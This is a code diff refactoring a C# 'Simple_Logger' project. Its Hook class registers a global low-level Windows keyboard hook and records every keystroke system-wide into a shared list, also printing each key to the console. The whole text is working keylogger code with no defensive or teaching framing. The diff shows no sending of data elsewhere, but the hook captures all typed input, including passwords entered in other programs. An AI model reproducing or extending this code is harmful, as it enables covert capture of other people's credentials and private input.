@@ -1,20 +1,29 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Windows.Forms;
 using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 namespace Simple_Logger
 {
     public class Hook
     {
+        // Variable definitions
+
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-        private static IntPtr _hookID = IntPtr.Zero;
-        public static LowLevelKeyboardProc _proc = HookCallback;
-        private static KeysConverter _converter = new KeysConverter();
 
-        public static List<string> Keys = new List<string>();
+        public static IntPtr _hookId = IntPtr.Zero;
+
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+        public static LowLevelKeyboardProc Proc = HookCallback;
+
+        // Used to convert virtual key codes to readable strings
+
+        private static readonly KeysConverter Converter = new KeysConverter();
+
+        // DLL Imports
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -29,38 +38,30 @@ namespace Simple_Logger
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-
-        public static void Main()
-        {
-            _hookID = SetHook(_proc);
-            Application.Run();
-            UnhookWindowsHookEx(_hookID);
-        }
+        // Registers hook with windows api
 
         public static IntPtr SetHook(LowLevelKeyboardProc proc)
         {
-            using (Process curProcess = Process.GetCurrentProcess())
-            using (ProcessModule curModule = curProcess.MainModule)
+            using (var curProcess = Process.GetCurrentProcess())
+            using (var curModule = curProcess.MainModule)
             {
                 return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                     GetModuleHandle(curModule.ModuleName), 0);
             }
         }
 
-        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+        // Process the key stroke
 
         private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
-                int vkCode = Marshal.ReadInt32(lParam);
-                Keys.Add(_converter.ConvertToString(vkCode));
-                Console.WriteLine(_converter.ConvertToString(vkCode));
+                var vkCode = Marshal.ReadInt32(lParam);
+                Logger.Keys.Add(Converter.ConvertToString(vkCode)?.ToLower());
+                Console.WriteLine(Converter.ConvertToString(vkCode)?.ToLower());
             }
 
-            return CallNextHookEx(_hookID, nCode, wParam, lParam);
+            return CallNextHookEx(_hookId, nCode, wParam, lParam);
         }
-
-
     }
 }
